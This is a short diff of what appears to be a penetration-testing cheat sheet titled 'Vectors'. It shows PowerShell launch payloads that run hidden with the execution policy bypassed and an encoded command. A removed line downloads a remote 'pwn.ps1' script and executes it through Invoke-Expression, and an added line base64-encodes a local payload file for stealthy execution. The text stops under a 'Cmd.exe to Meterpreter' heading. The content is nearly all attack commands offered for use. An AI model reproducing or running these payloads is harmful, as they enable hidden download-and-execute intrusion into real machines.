@@ -1,11 +1,11 @@
 ## Vectors
-###### Vector Payload
+###### Payload
 ```
-powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -encodedCommand
+powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -encodedCommand <code>
 ```
-###### b64encode this
+###### Test Payload
 ```
-Invoke-Expression -Command (Invoke-WebRequest("https://raw.githubusercontent.com/tfairane/Pentest/master/Vectors/pwn.ps1")).content
+powershell.exe -ExecutionPolicy Bypass -encodedCommand ([Convert]::ToBase64String(([System.Text.Encoding]::Unicode.GetBytes((Get-Content ./vector.payload.ps1)))))
 ```
 #### Cmd.exe to Meterpreter
 ```
